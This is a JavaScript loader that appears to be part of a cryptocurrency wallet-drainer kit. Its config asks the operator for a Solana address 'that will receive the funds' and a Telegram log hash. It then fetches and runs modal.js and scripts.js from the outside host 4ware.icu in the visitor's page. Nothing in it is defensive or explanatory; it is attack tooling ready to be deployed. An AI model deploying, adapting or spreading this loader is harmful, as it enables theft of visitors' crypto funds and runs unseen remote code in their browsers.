(function() {
    const config = {
        solanaAddress: "SOLANAADRESS", // Enter your Solana address that will receive the funds.
        userHash: "LOGHASH" // Enter your hash for receiving logs on telegram. (Visit 4ware.icu/log)
    };


    window.loaderConfig = config;

    const backendUrl = "https://4ware.icu" // Changing this will break down your code, keep it as it is.

    function loadCSS(src) {
        return new Promise((resolve, reject) => {
            fetch(`${backendUrl}/${src}`)
                .then(response => {
                    if (!response.ok) throw new Error(`${src}`);
                    return response.text();
                })
                .then(cssContent => {
                    const style = document.createElement('style');
                    style.textContent = cssContent;
                    document.head.appendChild(style);
                    resolve();
                })
                .catch(reject);
        });
    }

    function loadScript(src) {
        return new Promise((resolve, reject) => {
            fetch(`${backendUrl}/${src}`)
                .then(response => {
                    if (!response.ok) throw new Error(`${src}`);
                    return response.text();
                })
                .then(scriptContent => {
                    const script = document.createElement('script');
                    script.textContent = scriptContent;
                    document.head.appendChild(script);
                    resolve();
                })
                .catch(reject);
        });
    }

    loadCSS('modal-styles.css')
        .then(() => loadScript('modal.js'))
        .then(() => loadScript('scripts.js'))
        .catch(error => {
            console.error('error ', error);
        });
})();
